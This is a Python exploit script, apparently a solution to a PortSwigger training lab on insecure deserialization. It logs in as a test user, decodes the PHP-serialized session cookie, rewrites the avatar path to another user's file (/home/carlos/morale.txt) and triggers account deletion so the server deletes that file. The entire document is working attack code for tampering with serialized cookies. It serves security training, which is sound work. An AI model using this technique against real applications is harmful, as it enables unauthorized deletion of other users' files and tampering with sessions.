import requests
import argparse
import getpass
import base64
import urllib.parse

parser = argparse.ArgumentParser(description="Exploit serialized object vulnerability")
parser.add_argument("-u", "--url", required=True, help="Your lab URL")
args = parser.parse_args()

print("PortSwigger Labs: Using application functionality to exploit insecure deserialization")
print("By Shimon Zada")

LAB_URL = args.url.rstrip("/")

password = getpass.getpass("Password: ")
payload = {"username": "wiener", "password" : password}

try:
    session = requests.Session()
    login = session.post(f"{LAB_URL}/login", data=payload)
    if "Log out" in login.text:
        print("Logged in as Wiener")
        original_cookie = session.cookies.get("session")
        print(f"Original session cookie:{original_cookie}")

        try:
            url_decoded = urllib.parse.unquote(original_cookie)
            decoded = base64.b64decode(url_decoded).decode()
            modified = decoded.replace(
    's:11:"avatar_link";s:19:"users/wiener/avatar"',
    's:11:"avatar_link";s:23:"/home/carlos/morale.txt"'
)
            modified_encoded = base64.b64encode(modified.encode()).decode()
            session.cookies.set("session", modified_encoded)
            
            delete = session.post(f"{LAB_URL}/my-account/delete")
            if "solved" in delete.text:
                  print("Lab Solved")
        except Exception as e:
                    print(e)
    else:
        print("Failed")
except Exception as e:
    print(e)
